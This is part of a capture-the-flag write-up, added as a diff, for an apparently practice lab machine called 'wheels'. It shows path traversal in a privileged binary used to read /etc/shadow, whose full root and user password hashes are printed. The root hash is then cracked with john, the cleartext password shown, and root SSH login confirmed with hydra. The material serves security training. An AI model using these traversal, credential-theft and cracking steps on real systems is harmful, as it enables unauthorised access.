@@ -400,10 +400,219 @@ undefined8 main(void)
 }
 ```
 
+From the code we can tell whats going on 
+
+```
+1. It prints out "Which List do you want to open? [customers/employees]: "`
+2. It receives our input using fget and storing it in a buffer we can't really cause a buffer overflow cause fget is a secure function for getting inputs
+3. It compares the input with ";" "|" "&" and if those strings are there the program will exist immediately
+4. It then does an if statement to know when if the input is customers the programs open up /root/details/customers 
+
+but if the input isn't customer but employees it will open up /root/details/employee
+5. If those conditions are not meet it will print out "Oops something went wrong!!"
+```
+
+Now we know what it does we can exploit it to perform `file read` 
+
+Since the code doesn't filters `.` and doesn't perform any string validation to know if another character is passed we can use it to read local files in the system 
+
+Now lets read the /etc/shadow file of the system
+
+But we know the code checks for if `customers/employees` is passed as an input we will need to add that either as the first input argument or last
+
+But when we pass in `customers/employess` as the first input argument it will open up the file 
+
+```
+bob@wheels:/opt$ ./get-list                                                                                                                                                                                        
+                                                                                                                                                                                                                   
+                                                                                                                                                                                                                   
+Which List do you want to open? [customers/employees]: customers ../../etc/shadow                                                                                                                                  
+Opening File....                                                                                                                                                                                                   
+
+Michael
+Christopher
+Jessica
+Matthew
+Ashley
+Jennifer
+Joshua
+Amanda
+Daniel
+David
+James
+Robert
+John
+Joseph
+root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:0:99999:7:::
+daemon:*:18474:0:99999:7:::
+bin:*:18474:0:99999:7:::
+sys:*:18474:0:99999:7:::
+sync:*:18474:0:99999:7:::
+games:*:18474:0:99999:7:::
+man:*:18474:0:99999:7:::
+lp:*:18474:0:99999:7:::
+mail:*:18474:0:99999:7:::
+news:*:18474:0:99999:7:::
+uucp:*:18474:0:99999:7:::
+proxy:*:18474:0:99999:7:::
+www-data:*:18474:0:99999:7:::
+backup:*:18474:0:99999:7:::
+list:*:18474:0:99999:7:::
+irc:*:18474:0:99999:7:::
+gnats:*:18474:0:99999:7:::
+nobody:*:18474:0:99999:7:::
+systemd-network:*:18474:0:99999:7:::
+systemd-resolve:*:18474:0:99999:7:::
+systemd-timesync:*:18474:0:99999:7:::
+messagebus:*:18474:0:99999:7:::
+syslog:*:18474:0:99999:7:::
+_apt:*:18474:0:99999:7:::
+tss:*:18474:0:99999:7:::
+uuidd:*:18474:0:99999:7:::
+tcpdump:*:18474:0:99999:7:::
+landscape:*:18474:0:99999:7:::
+pollinate:*:18474:0:99999:7:::
+sshd:*:18634:0:99999:7:::
+systemd-coredump:!!:18634::::::
+lxd:!:18634::::::
+usbmux:*:18864:0:99999:7:::
+bob:$6$9hcN2TDv4v9edSth$KYm56Aj6E3OsJDiVUOU8pd6hOek0VqAtr25W1TT6xtmGTPkrEni24SvBJePilR6y23v6PSLya356Aro.pHZxs.:19123:0:99999:7:::
+mysql:!:19123:0:99999:7:::
+```
+
+So to make life easier for us so we don't need to start stressing ourself i'll use `customers` as the last argument 
+
+```
+bob@wheels:/opt$ ./get-list 
 
 
+Which List do you want to open? [customers/employees]: ../../etc/shadow customers
+Opening File....
+
+root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:0:99999:7:::
+daemon:*:18474:0:99999:7:::
+bin:*:18474:0:99999:7:::
+sys:*:18474:0:99999:7:::
+sync:*:18474:0:99999:7:::
+games:*:18474:0:99999:7:::
+man:*:18474:0:99999:7:::
+lp:*:18474:0:99999:7:::
+mail:*:18474:0:99999:7:::
+news:*:18474:0:99999:7:::
+uucp:*:18474:0:99999:7:::
+proxy:*:18474:0:99999:7:::
+www-data:*:18474:0:99999:7:::
+backup:*:18474:0:99999:7:::
+list:*:18474:0:99999:7:::
+irc:*:18474:0:99999:7:::
+gnats:*:18474:0:99999:7:::
+nobody:*:18474:0:99999:7:::
+systemd-network:*:18474:0:99999:7:::
+systemd-resolve:*:18474:0:99999:7:::
+systemd-timesync:*:18474:0:99999:7:::
+messagebus:*:18474:0:99999:7:::
+syslog:*:18474:0:99999:7:::
+_apt:*:18474:0:99999:7:::
+tss:*:18474:0:99999:7:::
+uuidd:*:18474:0:99999:7:::
+tcpdump:*:18474:0:99999:7:::
+landscape:*:18474:0:99999:7:::
+pollinate:*:18474:0:99999:7:::
+sshd:*:18634:0:99999:7:::
+systemd-coredump:!!:18634::::::
+lxd:!:18634::::::
+usbmux:*:18864:0:99999:7:::
+bob:$6$9hcN2TDv4v9edSth$KYm56Aj6E3OsJDiVUOU8pd6hOek0VqAtr25W1TT6xtmGTPkrEni24SvBJePilR6y23v6PSLya356Aro.pHZxs.:19123:0:99999:7:::
+mysql:!:19123:0:99999:7:::
+```
+
+Now lets crack the root password
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
+└─$ nano hash
+                                                                                                                                                                                                                   
+┌──(venv)─(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
+└─$ john -w=/home/mark/Documents/rockyou.txt hash 
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+highschoolmusical (root)     
+1g 0:00:00:03 DONE (2023-01-23 16:10) 0.2747g/s 1828p/s 1828c/s 1828C/s shearer..aditya
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Now we can ssh as root xD
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
+└─$ ssh root@192.168.66.202                                 
+root@192.168.66.202's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-113-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 23 Jan 2023 03:14:54 PM UTC
+
+  System load:  0.0               Processes:               220
+  Usage of /:   60.0% of 9.78GB   Users logged in:         0
+  Memory usage: 49%               IPv4 address for ens160: 192.168.66.202
+  Swap usage:   0%
 
 
+10 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Jan 23 15:11:16 2023 from 192.168.49.66
+root@wheels:~# ls -al
+total 44
+drwx------  7 root root 4096 Jan 23 13:50 .
+drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
+lrwxrwxrwx  1 root root    9 May 11  2022 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 May 11  2022 .cache
+drwxr-xr-x  2 root root 4096 May 11  2022 details
+drwxr-xr-x  3 root root 4096 Jan  7  2021 .local
+-rw-------  1 root root  195 May 11  2022 .mysql_history
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-------  1 root root   33 Jan 23 13:50 proof.txt
+drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
+drwx------  2 root root 4096 Jan  7  2021 .ssh
+root@wheels:~# 
+```
+
+If we had also brute force root password it would have work lol
+
+```                                                                                                                                                                                              
+┌──(venv)─(mark__haxor)-[~/_/B2B/Pg/Practice/Wheel]
+└─$ hydra -l root -p highschoolmusical ssh://192.168.66.202
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-23 16:13:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://192.168.66.202:22/
+[22][ssh] host: 192.168.66.202   login: root   password: highschoolmusical
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-23 16:13:21
+```
+
+And we're done 
+
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
 
 
 
